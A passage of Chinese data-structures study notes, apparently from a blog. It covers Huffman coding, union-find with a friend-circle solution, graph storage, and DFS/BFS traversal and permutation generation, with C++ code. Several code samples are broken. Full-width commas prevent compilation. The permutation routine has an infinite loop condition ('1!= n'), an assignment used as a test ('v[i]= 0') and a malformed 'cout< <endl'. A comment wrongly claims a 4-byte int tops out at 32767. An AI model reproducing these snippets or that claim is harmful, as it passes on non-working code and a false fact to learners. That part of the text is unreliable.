style="zoom:15%;"><ul><li><p>哈夫曼编码</p><p><strong>固定长度编码</strong>：每个字符使用相同长度的二进制位来表示；</p><p><strong>可变长度编码</strong>：允许对每个字符使用不同长度的二进制位来表示；</p><p>可变长度编码比固定长度编码好得多，其特点是<u>对频率高的字符赋予短编码，而对频率较低的字符则赋予较长一些的编码</u>，从而可以使平均编码长度减短，起到压缩数据的效果。哈夫曼编码是一种被广泛应用而且非常有效的数据压缩编码，它是可变长度编码。</p><p><strong>前缀编码</strong>：没有一个编码是另一个编码的前缀。前缀编码的解码操作相对简单，无需考虑重复前缀。哈夫曼编码属于前缀编码。</p><p><strong>构造哈夫曼编码</strong>首先要构造一棵哈夫曼树。 首先，将每个出现的字符当作一个独立的结点， 其权值为它出现的频度(或次数)，然后构造出对应的哈夫曼树。显然，所有字符结点都出现在叶结点中。我们可以<u>将字符的编码解释为从根至该字符的路径上边标记的序列</u>，其中边标记为0表示“转向左孩子”，标记为1表示“转向右孩子”。图13-7所示为-一个由哈夫曼树构造哈夫曼编码的示例，矩形方块<br>表示字符及其出现的次数。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715165926663.png" alt="image-20220715165926663"></p><p>这棵哈夫曼树的WPL为：WPL&#x3D;1*45+3*(13+12+16)+4*(5+9)&#x3D;224</p><p>此处的WPL可以视为最终编码得到二进制编码的长度，共224位。如果采用3位固定长度编码，则得到的二进制编码长度为300位。可见哈夫曼编码共压缩了约25%的数据。利用哈夫曼树可以设计出总长度最短的二进制前缀编码。</p></li></ul><h3 id="3-5-并查集"><a href="#3-5-并查集" class="headerlink" title="3.5 并查集"></a>3.5 并查集</h3><p>并查集是一种树形的数据结构，用于处理一些不相交集合(Disjoint Sets)的合并及查询问题。常常在使用中以森林来表示，进行快速规整。</p><p>并查集保持一组不相交的动态集合 S&#x3D;{S1, S2, ….., Sk }。**<u>每个集合通过一个代表来识别</u>**， 代表即集合中的某个成员。在某些应用中，哪一个成员被选作代表是无所谓的。在一些应用中，如何选择代表可能存在着预先说明的规则，例如选择集合中的最小元素。</p><p>集合中的每一个元素是由一个对象表示的，设x表示一个对象，则并查集应支持以下操作：</p><p>make_set(x)：建立一个新的集合，其唯一成员就是 x (x此时即是代表)。因为各集合是不相交的，故要求x没有在其他集合中出现过。</p><p>union_set(x, y)：如果x、y分属不同集合，则将包含x和y的动态集合<u>合并</u>为一个新的集合。</p><p>find_set(x)：返回一个指针，指向包含x所在的集合的代表。</p><ol><li><p><strong>单链表实现</strong></p><p>要实现并查集数据结构，一种简单的方法是每一个集合都用一个链表来表示。每个链表的第一个对象作为它所在集合的代表。链表中的每一个对象都包含<u>一个集合成员、 一个指向包含下一个集合成员的对象的指针，以及指向代表的指针</u>。每个链表都含head指针指向链表的代表，以及tail指针指向链表中最后的对象。</p></li><li><p><strong>并查集森林</strong></p><p>并查集的另一种更快的实现是用有根树来表示集合：每棵树表示一个集合， 树中的结点对应一个成员。在下图所示的并查集森林中，每个成员仅指向其父结点，父结点为其代表。<u>每棵树的根为整个集合的代表，并且是它自己的父结点</u>。</p><p>图13-8中左侧是两棵表示两个集合的树，左边的树表示集合{b, c, e, h}， 其中c为代表；右边的树表示集合{d, f, g}， 其中f为代表。右侧为union_set(e, g)的结果。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715191404196.png" alt="image-20220715191404196"></p><p>make_set创建一棵仅包含一个结点的树。</p><p>在执行find_set操作时，要沿着父结点指针一直找下去，直至找到树根为止。</p><p>union_set操作使得一棵树的根指向另一棵树的根。</p></li><li><p><strong>两种并查集森林的改进策略</strong></p><p>第一种是<strong>按秩合并</strong>，其思想是union_set操作使包含较少结点的树的根指向包含较多结点的树的根。</p><p>这种方法并不显式记录以每个结点为根的子树的大小，而是采用了一种能够简化分析的方法：对每个结点，<u>用秩表示结点高度的一个上界</u>。<u>在按秩合并中，具有较小秩的根在union_set操作中要指向具有较大秩的根</u>。</p><p>第二种是<strong>路径压缩</strong>，这种方法简单有效。它使一棵树的每个结点都直接指向根结点，如图13-9所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715191816132.png" alt="image-20220715191816132"></p></li></ol><blockquote><p>假如已知有n个人和m对好友关系(存于数字r)。如果两个人是直接或间接的好友(好友的好友的好友..)，则认为他们属于同一个朋友圈，请写程序求出这n个人里一共有多少个朋友圈。</p><p>假如：n&#x3D;5， m&#x3D;3, r&#x3D;{ {1,2},{2,3},{4,5} }， 表示有5个人，1 和2是好友，2和3是好友，和5是好友，则1、2、3属于一个朋友圈，4、5属于另一个朋友圈，结果为2个朋友圈。</p><p>最后请分析所写代码的时间、空间复杂度。评分会参考代码的正确性和效率。<br><code>int friends(int n, int m, int* r[]);</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> set [<span class="number">10001</span>];    <span class="comment">// 存储每个元素的代表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*带路径优化的并查集查找算法：查找集合x的代表，并使用路径压缩，让所有结点指向该代表*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i,j，r;</span><br><span class="line">r=x;</span><br><span class="line"><span class="keyword">while</span>(set[r] != r) <span class="comment">//寻找此集合的代表</span></span><br><span class="line">r=set[r];      <span class="comment">// 只有根结点满足r=set[r]，因此当r=set[r]时，表示找到了该集合的代表，即根结点</span></span><br><span class="line">i=x;</span><br><span class="line"><span class="keyword">while</span>(i != r)&#123;     <span class="comment">//使得r代表的集合中，所有结点直接指向r，即路径压缩</span></span><br><span class="line">j=set[i];</span><br><span class="line">set[i]=r;</span><br><span class="line">i=j;       <span class="comment">// 继续更新i原来的代表j</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x , <span class="type">int</span> y)</span> </span>&#123;   <span class="comment">//优化的并查集归并算法</span></span><br><span class="line"><span class="type">int</span> t=<span class="built_in">find</span>(x);    <span class="comment">// 找到x的代表</span></span><br><span class="line"><span class="type">int</span> h=<span class="built_in">find</span>(y);    <span class="comment">// 找到y的代表</span></span><br><span class="line"><span class="keyword">if</span>(t&lt;h)   <span class="comment">// 合并两个集合，令x的代表指向y的代表，或者反过来</span></span><br><span class="line">set[h]=t;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">set[t]=h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// n个结点，m个关系</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">friends</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m，<span class="type">int</span>* r[])</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i，count;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span> ;i&lt;=n; ++i) <span class="comment">//初始化并查集，分支数为n，各点为孤立点，各结点代表就是自身，所以set[i]=i</span></span><br><span class="line">set[i]=i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;m; ++i)  <span class="comment">//读入r，r[i][0]和r[i][1]为有关系的结点</span></span><br><span class="line"><span class="built_in">merge</span>(r[i][<span class="number">0</span>], r[i][<span class="number">1</span>]);</span><br><span class="line">count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(set[i] == i) <span class="comment">//统计代表是自己的结点个数，也即朋友圈</span></span><br><span class="line">++count;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_40378034/article/details/103224445">https://blog.csdn.net/qq_40378034/article/details/103224445</a></p><h2 id="4-图"><a href="#4-图" class="headerlink" title="4 图"></a>4 图</h2><h3 id="4-1-图的基本概念"><a href="#4-1-图的基本概念" class="headerlink" title="4.1 图的基本概念"></a>4.1 图的基本概念</h3><p>图G由顶点集V和边集E组成，记为G&#x3D;(V, E)，其中V(G)表示图G中顶点的有限非空集；E(G)表示图G中顶点之间的关系(边)集合。若 V &#x3D; {$v_1$, $v_2$, …, $v_n$}，用|V|表示图G中<u>顶点的个数</u>，也称为<strong>图G的阶</strong>，E&#x3D;{(u, v)|u∈V, v∈ V}，用E表示图G中边的条数。</p><p>注意：线性表可以是空表，树可以是空树，但<strong>图不可以是空图</strong>。就是说，图中不能一个顶点也没有，图的顶点集V一定非空，但边集E可以为空，此时图中只有顶点而没有边。</p><p><strong>有向图</strong>：若E是有向边（也称为弧）的有限集合时，则图G为有向图。</p><p><strong>无向图</strong>：若E是无向边（简称边）的有限集合时，则图G为无向图。</p><p>在无向图中，如果<u>任意两个顶点之间都存在边</u>，则称该图为<strong>无向完全图</strong>。含有n个顶点的无向完全图有<strong>n(n-1)&#x2F;2</strong>条边。</p><p>在有向图中，如果<u>任意两个顶点之间都存在方向相反的两条弧</u>，则称该图为<strong>有向完全图</strong>。含有n个顶点的有向完全图有**n(n-1)**条有向边。</p><p>设有两个图G&#x3D;(V, E)和G’&#x3D;(V’, E’)，若V是V的子集，且E是E的子集，则称G是G的子图。若有满足V(G)&#x3D;V(G’)的子图G，则为G的<strong>生成子图</strong>。</p><p><u><strong>在无向图中</strong></u>，若从顶点v到顶点w<u>有路径存在</u>，则称v和w是连通的。若图G中任意两个顶点都是连通的，则称图G为<strong>连通图</strong>，否则称为非连通图。无向图中的极大连通子图称为<strong>连通分量</strong>。<u>如果一个图有n个顶点，并且有小于n-1条边，则此图必是非连通图。</u>如图14-1(a)所示，图G有3个连通分量。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716124316623.png" alt="image-20220716124316623"></p><p><strong><u>在有向图中</u><strong>，若<u>从顶点v到顶点w和从顶点w到顶点v之间都有路径</u>，则称这两个顶点是</strong>强连通</strong>的。若图中任何一对顶点都是强连通的，则称此图为强连通图。<u>有向图中的<strong>极大强连通子图</strong></u>称为有向图的<strong>强连通分量</strong>，图G2的强连通分量如图14-2 所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716142549034.png" alt="image-20220716142549034"></p><p>图中每个<strong>顶点的度</strong>定义为以该顶点为一个端点的边的数目。对于无向图，顶点v的度是指依附于该项点的边的条数，记为TD(1)。在无向图中，**<u>无向图的全部顶点的度之和等于边数的两倍</u>**，这是因为每条边和两个顶点相关联。</p><p>对于有向图，顶点v的度分为<strong>入度</strong>和<strong>出度</strong>，入度是以顶点v为终点的有向边的数目；而出度是以顶点v为起点的有向边的数目。 顶点v的度等于其入度和出度之和，在有向图中，**<u>有向图的全部顶点的入度之和与出度之和相等并且等于边数</u>**。这是因为每条有向边都有一个起点和终点。</p><h3 id="4-2-图的存储及基本操作"><a href="#4-2-图的存储及基本操作" class="headerlink" title="4.2 图的存储及基本操作"></a>4.2 图的存储及基本操作</h3><h4 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h4><p>所谓邻接矩阵存储，就是用一个二维数组存储图中边的信息( 即各顶点之间的邻接关系)，存储顶点之间邻接关系的二维数组称为邻接矩阵。</p><p>结点数为n的图G&#x3D;(V, E)的邻接矩阵A是n*n的。将G的顶点编号为$v_1$, $v_2$, …, $v_n$。若$(v_i, v_j)∈E$，则$A[i][j]&#x3D;1$，否则，$A[i][j]&#x3D;0$。</p><p>$A[i][j]&#x3D;\begin{cases} 1,\quad若(v_i, v_j)或&lt;v_i,v_j&gt;是E(G)中的边\ 0,\quad若(v_i, v_j)或&lt;v_i,v_j&gt;不是E(G)中的边 \end{cases}$</p><p>对于带权图而言，若顶点$v_i$和$v_j$之间有边相连，则邻接矩阵中对应项存放着该边对应的权值，若顶点$v_i$和$v_j$不相连，则用∞来代表这两个顶点之间不存在边。</p><p>$A[i][j]&#x3D;\begin{cases} w_{ij},\quad若(v_i, v_j)或&lt;v_i,v_j&gt;是E(G)中的边\ 0或\infty,\quad若(v_i, v_j)或&lt;v_i,v_j&gt;不是E(G)中的边 \end{cases}$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXV <span class="string">&lt;最大顶点数&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 32767   <span class="comment">// 4字节int型数值的最大数为32767</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;     <span class="comment">// 顶点类型</span></span><br><span class="line">    <span class="type">int</span> no;</span><br><span class="line">    InfoType info;</span><br><span class="line">&#125;VertexType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;     <span class="comment">// 邻接矩阵</span></span><br><span class="line">    <span class="type">int</span> edges[MAXV][MAXV];</span><br><span class="line">    <span class="type">int</span> n, e;       <span class="comment">// 顶点数、边数</span></span><br><span class="line">    VertexType vexs[MAXV];  <span class="comment">// 存放顶点信息</span></span><br><span class="line">&#125;MatGraph;</span><br></pre></td></tr></table></figure><p>图的邻接矩阵存储表示法具有以下<strong>特点</strong>:</p><ol><li><p>无向图的邻接矩阵一定是一个对称矩阵（并且唯一）。</p></li><li><p>对于无向图，邻接矩阵的第i行（或第i列）非零元素（或非∞元素）的个数正好是第i个顶点的度。</p></li><li><p>对于有向图，邻接矩阵的第i行（或第i列）非零元素（或非∞元素）的个数正好是第i个顶点的出度（或入度）。</p></li><li><p>用邻接矩阵方法存储图，很容易确定图中任意两个顶点之间是否有边相连。但是，要确定图中有多少条边，则必须按行、按列对每个元素进行检测，所花费的时间代价很大。</p></li><li><p>稠密图适合使用邻接矩阵的存储表示。</p></li></ol><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716145053866.png" alt="image-20220716145053866"></p><h4 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h4><p>所谓邻接表就是对图G中的每个顶点v建立一个单链表， 第i个单链表中的结点表示关联于顶点$v_i$的边(对于有向图则是以顶点$v_i$的起点的边)，这个单链表就称为顶点$v_i$的的边表（对于有向图则称为出边表）。边表的头指针和顶点的数据信息采用顺序存储（称为顶点表），所以在邻接表中存在两种结点：顶点表结点和边表结点，如图144所示。顶点表中，<u>data存储顶点$v_i$的名称或其他信息</u>，<u>firstarc指向顶点$v_i$的单链表中的首结点</u>；边表的<u>adjvex表示与顶点$v_i$邻接的顶点编号</u>，<u>nextarc指向下一个边结点</u>，另外还可以有一个weight数值域，存放边的权值等信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716145613595.png" alt="image-20220716145613595"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 顶点表（头结点）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Vnode</span>&#123;</span><br><span class="line">    InfoType info;      <span class="comment">//顶点的其他信息</span></span><br><span class="line">    ArcNode *firstarc;  <span class="comment">//指向第一个边结点</span></span><br><span class="line">&#125;VNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 边表（边结点）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ANode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex;               <span class="comment">//该边的邻接点编号</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ANode</span> *nextarc;    <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">// int weight;              //该边的相关信息，比如权值</span></span><br><span class="line">&#125;ArcNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">VNode adjlist[MAXV];      <span class="comment">//邻接表的头结点数组</span></span><br><span class="line">    <span class="type">int</span> n, e;                 <span class="comment">// 图的顶点数n、边数e</span></span><br><span class="line">&#125;AdjGraph;</span><br></pre></td></tr></table></figure><p>图的邻接表存储方法具有以下特点:</p><p>1 )如果G为无向图，则所需的存储空间为O (V+2|E|)；如果G为有向图，则所需的存储空间为O (V+|E|)。前者的倍数2是由于无向图中，每条边在邻接表中出现了两次。<br>2) 对于稀疏图，采用邻接表表示将极大地节省存储空间。<br>3) 在邻接表中，给定一顶点，能很容易地找出它的所有邻边，因为只需要读取它的邻接表就可以。在邻接矩阵中，相同的操作则需要扫描一行， 花费的时间为O(n)。但是，如果要确定给定的两个顶点间是否存在边，则在邻接矩阵里可以立刻查到，在邻接表中则需要在相应结点对应的边表中查找另一结点，效率较低。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716145653449.png" alt="image-20220716145653449"></p><h3 id="4-3-图的遍历"><a href="#4-3-图的遍历" class="headerlink" title="4.3 图的遍历"></a>4.3 图的遍历</h3><h4 id="x3D-x3D-深度优先搜索DFS-x3D-x3D"><a href="#x3D-x3D-深度优先搜索DFS-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;深度优先搜索DFS&#x3D;&#x3D;"></a>&#x3D;&#x3D;深度优先搜索DFS&#x3D;&#x3D;</h4><p>深度优先搜索（DFS）类似于树的先序遍历。它的基本思想如下：首先访问图中某一起始顶点v，然后由v出发，访问与v邻接且未被访问的任一顶点$w_1$，再访问与$w_1$邻接且未被访问的任一顶点$w_2$, ……重复上述过程。<u>当不能再继续向下访问时，依次退回到最近被访问的顶点，若它还有邻接顶点未被访问过，则从该点开始继续上述搜索过程</u>，直到图中所有顶点均被访问过为止。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*以邻接表为存储结构的深度优先遍历算法*/</span></span><br><span class="line"><span class="type">int</span> visited[MAX] = &#123;<span class="number">0</span>&#125;;   <span class="comment">// 全局数组，标记顶点是否已被访问</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(AdjGraph *G, <span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">    ArcNode *p;           <span class="comment">// 边结点</span></span><br><span class="line">    visited[v] = <span class="number">1</span>;       <span class="comment">// 访问该结点，置访问标记为1</span></span><br><span class="line">    cout&lt;&lt;v&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    p = G-&gt;adjlist[v].firstarc;  <span class="comment">// p指向顶点v的第一个邻接点</span></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)  <span class="comment">//若编号为p-&gt;adjvex的结点p未被访问，则递归访问它，继续遍历它的邻接点</span></span><br><span class="line">            <span class="built_in">DFS</span>(G, p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;nextarc;          <span class="comment">// 一轮深度优先遍历结束后，回退到出发点，继续遍历剩余邻接结点，p指向顶点v的下一个邻接点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="x3D-x3D-广度优先搜索-BFS-x3D-x3D"><a href="#x3D-x3D-广度优先搜索-BFS-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;广度优先搜索 BFS&#x3D;&#x3D;"></a>&#x3D;&#x3D;广度优先搜索 BFS&#x3D;&#x3D;</h4><p>广度优先搜索（BFS）类似于二叉树的层序遍历算法，它的基本思想是：首先访问起始项点v，接着由v出发，依次访问v的各个未访问过的邻接顶点$w_1$, $w_2$, …, $w_i$，然后再依次访问$w_1$, $w_2$, …, $w_i$的所有未被访问过的邻接顶点；再从这些访问过的顶点出发，再访问它们所有未被访问过的邻接顶点…..以此类推，直到图中所有顶点都被访问过为止。类似的思想还将应用于Dijkstra单源最短路径算法和Prim最小生成树算法。</p><p>广度优先搜索是一种分层的查找过程，每向前走一步可能访问一批顶点，不像深度优先搜索那样有往回退的情况，因此它不是一个递归的算法。为了实现逐层的访问，算法必须借助一个辅助队列，以记忆正在访问的顶点的下一层顶点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BFS</span><span class="params">(AdjGraph *G, <span class="type">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> w, i;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    SqQueue *qu;    <span class="comment">// 用于存储下一次广度搜索时要访问的结点</span></span><br><span class="line">    <span class="built_in">InitQueue</span>(qu);</span><br><span class="line">    <span class="type">int</span> visited[MAXV];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; G-&gt;n; i++) visited[i] = <span class="number">0</span>;   <span class="comment">//标记顶点是否已被访问</span></span><br><span class="line">    cout&lt;&lt;v&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    visited[v] = <span class="number">1</span>;          <span class="comment">// 置已访问标记</span></span><br><span class="line">    <span class="built_in">enQueue</span>(qu, v);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">QueueEmpty</span>(qu))&#123;  <span class="comment">// 队列不为空时</span></span><br><span class="line"><span class="built_in">deQueue</span>(qu, w);               <span class="comment">// 出队，顶点编号存入w</span></span><br><span class="line">        p = G-&gt;adjlist[w].firstarc;   <span class="comment">// p指向w的第一个邻接结点</span></span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;               <span class="comment">// 访问p所有的邻接结点，并将其入队，以进行下一次广度搜索</span></span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                cout&lt;&lt;p-&gt;adjvex&lt;&lt;<span class="string">&quot; &quot;</span>; <span class="comment">// 访问该邻接结点，并置访问标记为1</span></span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">enQueue</span>(qu, p-&gt;adjvex);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;nextarc;   <span class="comment">// 若访问过，则继续遍历其余邻接结点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-图遍历算法的应用"><a href="#4-4-图遍历算法的应用" class="headerlink" title="4.4 图遍历算法的应用"></a>4.4 图遍历算法的应用</h3><ol><li><strong>判断图的连通性</strong></li></ol><p>图的遍历算法可以用来判断图的连通性。对于无向图来说，如果无向图是连通的，则从任一结点出发，仅需一次遍历就能够访问图中所有顶点；如果无向图是非连通的，则从某一个顶点出发，一次遍历只能访问到该顶点所在连通分量的所有顶点，而对于图中其他连通分量的顶点，则无法通过这次遍历访问。对于有向图来说，若从初始点到图中的每个顶点都有路径，则能够访问到图中的所有顶点，否则不能访问到所有顶点。</p><ol start="2"><li><strong>遍历解答树</strong></li></ol><p>在问题求解时，对所有可能的问题解构成一棵树，而最优解或者符合要求的解就是该树的一条路径或者一个结点。这种树称为解答树。</p><blockquote><p>例1：比如1,2…n的排列一共有n!个，生成它们至少需要n!的时间。图14-6是生成123的全排列的解答树。通过深度优先遍历DFS就可以输出1,2…n的全排列</p></blockquote><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716201706661.png" alt="image-20220716201706661"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">13</span>;   <span class="comment">//n 的最大值</span></span><br><span class="line"><span class="type">int</span> d[N];         <span class="comment">//记录解</span></span><br><span class="line"><span class="type">int</span> v[N];         <span class="comment">//记录某个值是否被遍历过，没遍历过为0，遍历过后为1</span></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> depth)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (depth&gt;=n) &#123;     <span class="comment">// 到达叶子结点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; <span class="number">1</span>!= n; ++i)</span><br><span class="line">cout&lt;&lt;d[i] ;</span><br><span class="line">cout&lt; &lt;endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; ++i) &#123;  <span class="comment">// 第一层，1, 2, ……, n</span></span><br><span class="line"><span class="keyword">if</span>(v[i]= <span class="number">0</span>) &#123;       <span class="comment">// 选择未被访问的数</span></span><br><span class="line">v[i]=<span class="number">1</span>;         <span class="comment">// 置访问标记为1</span></span><br><span class="line">d[depth]=i;</span><br><span class="line"><span class="built_in">dfs</span>(depth+<span class="number">1</span>);   <span class="comment">// 递归遍历下一层</span></span><br><span class="line">v[i]=<span class="number">0</span>;         <span class="comment">// 回退，标记数i未被访问</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="built_in">memset</span>(v, <span class="number">0</span>, n);   <span class="comment">// 初始化数组v，将v中前n个字节置0</span></span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照相同的原理，输出数组的全排列：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">perm</span><span class="params">(<span class="type">int</span> list[], <span class="type">int</span> k, <span class="type">int</span> m)</span> </span>&#123;    <span class="comment">// k表示遍历解答树的深度，m表示数组下标最大值</span></span><br><span class="line"><span class="keyword">if</span>(k &gt; m) &#123;</span><br><span class="line"><span class="built_in">copy</span>(list，list+k, <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    